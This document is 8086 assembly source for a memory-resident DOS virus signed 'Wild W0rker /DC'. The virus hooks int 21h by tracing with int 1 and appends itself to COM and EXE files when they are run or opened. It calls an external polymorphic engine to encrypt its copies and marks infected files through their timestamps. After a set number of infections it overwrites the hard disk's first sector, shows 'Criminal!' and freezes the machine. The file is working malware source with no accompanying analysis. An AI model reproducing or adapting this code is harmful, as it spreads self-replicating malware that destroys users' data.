.8086
.model  tiny
.code

virussize       equ     offset speend - offset start

start:
         call    $+3
         pop     si
         sub     si,3
         mov     ax,4270h
         int     21h
         cmp     ax,'ww'
         jne     virsetup
         jmp     AllreadyInstalled
virsetup:
         call    virlen
         sub     word ptr ds:[2],ax
         mov     bp,word ptr ds:[2]
         mov     dx,ds
         sub     bp,dx
         push    es
         mov     ah,4ah
         mov     bx,0ffffh
         int     21h
         mov     ah,4ah
         int     21h
         dec     dx
         mov     ds,dx
         mov     ax,word ptr ds:[3]
         mov     bx,ax
         call    virlen
         sub     bx,ax
         mov     ax,bx
         add     dx,ax
         mov     word ptr ds:[3],ax
         inc     dx
         mov     es,dx
         mov     byte ptr es:[0],5ah
         mov     word ptr es:[1],8
         call    virlen
         mov     word ptr es:[3],ax
         inc     dx
         mov     es,dx
         pop     dx
         push    es
         push    cs
         pop     ds
         mov     cx,virussize
         xor     di,di
         cld
         rep     movsb
         mov     si,offset inhigh
         push    si
         mov     es,dx
         mov     ah,4ah
         mov     bx,bp
         int     21h
         retf

AllreadyInstalled:
         mov     bp,si
         add     si,offset oldbyte
         mov     ax,word ptr cs:[si]
         not     ax
         cmp     ax, not 5A4Dh
         je      jmp2exe
         mov     di,100h
         push    cs
         pop     ds
         push    ss di ss
         pop     es
         mov     cx,18h
         cld
         rep     movsb
         push    es
         pop     ds
         call    clear_exit
         xor     bp,bp
         retf

jmp2exe:
         mov     ah,62h
         int     21h
         mov     ds,bx
         mov     es,bx
         add     bx,10h
         add     word ptr cs:[bp+oldbyte+16h],bx
         cli
         add     bx,word ptr cs:[bp+oldbyte+0eh]
         mov     ss,bx
         mov     sp,word ptr cs:[bp+oldbyte+10h]
         call    clear_exit
         sti
         jmp     dword ptr cs:[bp+oldbyte+14h]

clear_exit:
         xor     ax,ax
         xor     cx,cx
         xor     dx,dx
         xor     si,si
         xor     di,di
         xor     bx,bx
         ret

inhigh:
         push    cs
         pop     ds
         mov     word ptr ds:[mycs],cs

         mov     bx,1
         call    getint

         mov     word ptr ds:[v01],di
         mov     word ptr ds:[v01+2],es

         mov     bx,1
         lea     si,ent01
         call    setint

         mov     byte ptr ds:[setjmp],0
         mov     byte ptr ds:[traceok],0

         pushf
         pop     ax
         or      ah,1
         push    ax
         popf

         xor     ax,ax
         mov     ds,ax
         mov     ah,30h
         pushf
         call    dword ptr ds:[21h*4]

         call    swapint21

         pushf
         pop     ax
         and     ah,0feh
         push    ax
         popf

         xor     si,si

         jmp     AllreadyInstalled

ent01:
         push    bp
         mov     bp,sp
         push    ax
         mov     ax,cs
         cmp     word ptr ss:[bp+4],ax
         je      exit01
         cmp     byte ptr cs:[setjmp],1
         jne     getint21
         dec     byte ptr cs:[counter]
         jnz     exit01
         call    swapint21
         mov     byte ptr cs:[setjmp],0
         jmp     restint01
getint21:
         cmp     byte ptr cs:[traceok],1
         je      restint01
         cmp     word ptr ss:[bp+4],0
         je      exit01
         cmp     word ptr ss:[bp+4],300h
         jnc     exit01
         mov     ax,word ptr ss:[bp+2]
         mov     word ptr cs:[v21org],ax
         mov     ax,word ptr ss:[bp+4]
         mov     word ptr cs:[v21org+2],ax
         mov     byte ptr cs:[traceok],1
restint01:
         and     word ptr ss:[bp+6],0feffh
         push    bx si ds
         lds     si,dword ptr cs:[v01]
         mov     bx,1
         call    setint
         pop     ds si bx
exit01:
         pop     ax bp
         iret

swapint21:
         cli
         push    ds es di si ax cx
         push    cs
         pop     ds
         mov     cx,5
         lea     si,jmptome
         les     di,dword ptr ds:[v21org]
swp:
         mov     al,byte ptr ds:[si]
         xchg    al,byte ptr es:[di]
         mov     byte ptr ds:[si],al
         inc     di
         inc     si
         loop    swp
         pop     cx ax si di es ds
         sti
         ret

installed:
         call    popall
         call    dos
         call    swapint21
         mov     ax,'ww'
         retf    2

ent21:
         call    pushall
         call    swapint21
         cmp     ax,4270h
         je      installed
         call    set24
         cmp     ax,4b00h
         je      infect1
         cmp     ah,3dh
         je      infect3d
         jmp     exit21_2
infect3d:
         call    checkname
         jnc     infect1
         jmp     exit21_2
infect1:
         cmp     word ptr cs:[infcnt],1313h
         jne     infcontinue
         jmp     killer
infcontinue:
         mov     word ptr cs:[fname],dx
         mov     word ptr cs:[fname+2],ds
         mov     ax,4300h
         call    dos
         jnc     getattr
         jmp     exit21_2
getattr:
         mov     word ptr cs:[attr],cx
         mov     ax,4301h
         xor     cx,cx
         call    dos
         jnc     setattr
         jmp     exit21_2
setattr:
         mov     ax,3d02h
         call    dos
         jnc     openf
         jmp     restoreattr
openf:
         xchg    ax,bx
         push    cs
         pop     ds
         mov     ax,5700h
         call    dos
         mov     word ptr ds:[ftime],cx
         mov     word ptr ds:[fdate],dx
         and     cx,1fh
         cmp     cx,1fh
         jne     infectcontinue
         jmp     closefile
infectcontinue:
         mov     ah,3fh
         mov     cx,18h
         lea     dx,oldbyte
         call    dos
         jnc     readfile
         jmp     restoretime
readfile:
         mov     cx,18h
         push    cs
         pop     es
         lea     di,bytes
         lea     si,oldbyte
         cld
         rep     movsb

         mov     ax,word ptr ds:[bytes]
         not     ax
         cmp     ax,not 'MZ'
         jne     chk1
         jmp     exeinf
chk1:
         cmp     ax,not 'ZM'
         jne     comok
         jmp     exeinf
comok:
         mov     ax,4202h
         xor     cx,cx
         xor     dx,dx
         call    dos
         or      dx,dx
         jz      sizeok1
         jmp     restoretime
sizeok1:
         cmp     ax,60000
         jb      sizeok2
clfile:
         jmp     restoretime
sizeok2:
         cmp     ax,1024
         jb      clfile
         mov     bp,ax
         sub     ax,3
         mov     byte ptr ds:[bytes],0e9h
         mov     word ptr ds:[bytes+1],ax
         add     bp,100h
         mov     ah,1
         call    rndget
addvirus:
         inc     word ptr ds:[infcnt]
         call    calcseg
         mov     cx,virussize
         lea     si,start
         push    bx
         call    spe
         pop     bx
         push    es
         pop     ds
         mov     ah,40h
         xor     dx,dx
         call    dos
         push    cs
         pop     ds
         jnc     writebody
         jmp     restoretime
writebody:
         mov     ax,4200h
         xor     cx,cx
         xor     dx,dx
         call    dos

         mov     ah,40h
         lea     dx,bytes
         mov     cx,18h
         call    dos
         jnc     writeheader
         jmp     restoretime
writeheader:
         mov     cx,word ptr ds:[ftime]
         or      cx,1fh
         jmp     short settim1
restoretime:
         mov     cx,word ptr ds:[ftime]
settim1:
         mov     dx,word ptr ds:[fdate]
         mov     ax,5701h
         call    dos
closefile:
         mov     ah,3eh
         call    dos
restoreattr:
         mov     ax,4301h
         mov     cx,word ptr ds:[attr]
         lds     dx,dword ptr ds:[fname]
         call    dos

exit21_2:
         call    restore24
         push    cs
         pop     ds
         mov     bx,1
         call    getint
         mov     word ptr ds:[v01],di
         mov     word ptr ds:[v01+2],es

         mov     byte ptr ds:[setjmp],1
         mov     byte ptr ds:[counter],5

         lea     si,ent01
         mov     bx,1
         call    setint

         pushf
         pop     ax
         or      ah,1
         push    ax
         popf

         call    popall
         jmp     dword ptr cs:[v21org]

pushall:
         pop     word ptr cs:[saveip]
         push    ax bx cx dx ds es si di bp
         jmp     word ptr cs:[saveip]

popall:
         pop     word ptr cs:[saveip]
         pop     bp di si es ds dx cx bx ax
         jmp     word ptr cs:[saveip]

exeinf:
         mov     ax,4202h
         xor     cx,cx
         xor     dx,dx
         call    dos
         jnc     exeinf1
         jmp     restoretime
exeinf1:
         mov     word ptr ds:[flen],ax
         mov     word ptr ds:[flen+2],dx
         push    bx
         mov     bx,10h
         div     bx
         mov     bx,word ptr ds:[bytes+8h]
         mov     word ptr ds:[bytes+14h],dx
         mov     bp,dx
         sub     ax,bx
         mov     word ptr ds:[bytes+16h],ax
         mov     bx,virussize
         mov     cl,4
         shr     bx,cl
         inc     bx
         add     ax,bx
         mov     word ptr ds:[bytes+0eh],ax
         mov     word ptr ds:[bytes+10h],100h
         mov     ax,virussize
         mov     dx,word ptr ds:[flen+2]
         add     ax,word ptr ds:[flen]
         adc     dx,0
         mov     bx,200h
         div     bx
         or      dx,dx
         jz      exeinf2
         inc     ax
         xor     dx,dx
exeinf2:
         mov     word ptr ds:[bytes+4],ax
         mov     word ptr ds:[bytes+2],dx
         pop     bx
         mov     al,1
         jmp     addvirus

dos:
         pushf
         db      09ah
v21org  dw      0,0
         ret

checkname:
         mov     di,dx
         push    ds
         pop     es
         mov     cx,128
         cld
         mov     al,0
         repne   scasb
         jne     error1
         mov     si,di
         sub     si,4
         lodsw
         or      ax,2020h
         cmp     ax,'oc'
         je      chklast
         cmp     ax,'xe'
         jne     error1
chklast:
         lodsb
         or      al,20h
         cmp     al,'m'
         je      nameok
         cmp     al,'e'
         je      nameok
error1:
         stc
         ret
nameok:
         clc
         ret

ent24:
         mov     al,3
         iret

         db      'Wild W0rker /DC'

set24:
         push    bx es di ds si
         mov     bx,24h
         push    bx
         call    getint
         mov     word ptr cs:[v24],di
         mov     word ptr cs:[v24+2],es
         pop     bx
         push    cs
         pop     ds
         lea     si,ent24
         call    setint
         pop     si ds di es bx
         ret
restore24:
         push    ds si bx
         mov     bx,24h
         lds     si,dword ptr cs:[v24]
         call    setint
         pop     bx si ds
         ret

; ds:si - int handler
; bx - int number
setint:
         cli
         push    ax es
         shl     bx,1
         shl     bx,1
         xor     ax,ax
         mov     es,ax
         mov     word ptr es:[bx],si
         mov     word ptr es:[bx+2],ds
         pop     es ax
         sti
         ret

; bx - int num.
; out: es:di - int handler
getint:
         cli
         push    ax
         shl     bx,1
         shl     bx,1
         xor     ax,ax
         mov     es,ax
         les     di,dword ptr es:[bx]
         pop     ax
         ret

calcseg:
         push    ax
         lea     si,speend
         mov     cl,4
         shr     si,cl
         mov     ax,es
         add     ax,si
         inc     ax
         mov     es,ax
         pop     ax
         ret

killer:
         mov     ax,0301h
         mov     dx,80h
         mov     cx,1
         int     13h

         mov     ax,3
         int     10h
         push    cs
         pop     ds
         lea     si,mes
         mov     word ptr ds:[pos],160*3
         mov     bp,word ptr ds:[pos]
         call    writebig
         cli
         jmp     $

writebig:
         xor     ax,ax
         lodsb
         cmp     al,255
         je      nextline
         cmp     al,0
         je      endwrt
         push    ds si
         mov     si,0f000h
         mov     ds,si
         add     si,0a6eh
         mov     cl,3
         shl     ax,3
         add     si,ax
         call    bigchar
         pop     si ds
         add     word ptr ds:[pos],18
         jmp     writebig
nextline:
         mov     ax,word ptr ds:[pos]
         sub     ax,bp
         mov     bx,160
         sub     bx,ax
         add     word ptr ds:[pos],bx
         add     word ptr ds:[pos],9*160
         jmp     writebig
endwrt:
         ret

bigchar:
         mov     di,0b800h
         mov     es,di
         mov     di,word ptr cs:[pos]
         mov     cx,8
cycle01:
         push    cx
         lodsb
         mov     cx,7
cycle02:
         push    ax
         shr     al,cl
         and     al,1
         jnz     setbit
         mov     al,32
         jmp     short printbit
setbit:
         mov     al,219
printbit:
         stosb
         inc     di
         pop     ax
         loop    cycle02
         add     di,160-14
         pop     cx
         loop    cycle01
         add     word ptr ds:[pos],di
         ret

pos     dw      0
mes     db      'Criminal!',255,'by WW /DC',0

virlen:
         push    cx
         mov     ax,offset speend
         sub     ax,offset start
         mov     cx,3
         shr     ax,cl
         add     ax,10h
         pop     cx
         ret

jmptome db      0eah
         dw      offset ent21
mycs    dw      0
oldbyte dw      18h / 2  dup (20cdh)
bytes   dw      18h / 2  dup (20cdh)
v01     dw      0,0
setjmp  db      0
counter db      0
saveip  dw      0
traceok db      0
fdate   dw      0
ftime   dw      0
fname   dw      0,0
attr    dw      0
flen    dw      0,0
v24     dw      0,0
infcnt  dw      0
extrn   spe:near
extrn   speend:near
extrn   rndget:near
last:
         end     start
